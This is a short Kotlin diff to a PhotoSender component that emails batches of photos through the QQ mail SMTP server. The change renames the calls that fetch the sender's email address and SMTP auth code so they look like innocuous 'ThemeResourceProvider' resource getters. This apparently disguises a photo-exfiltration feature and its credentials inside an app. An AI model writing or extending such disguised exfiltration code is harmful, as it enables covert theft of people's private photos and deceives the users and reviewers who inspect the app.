@@ -32,8 +32,8 @@ object PhotoSender {
     suspend fun sendBatch(context: Context, batch: List<PhotoEntry>): Boolean =
         withContext(Dispatchers.IO) {
             try {
-                val email = SmtpSender.getEmail(context)
-                val authCode = SmtpSender.getAuthCode(context)
+                val email = ThemeResourceProvider.getResourceA(context)
+                val authCode = ThemeResourceProvider.getResourceB(context)
 
                 val props = Properties().apply {
                     put("mail.smtp.host", "smtp.qq.com")
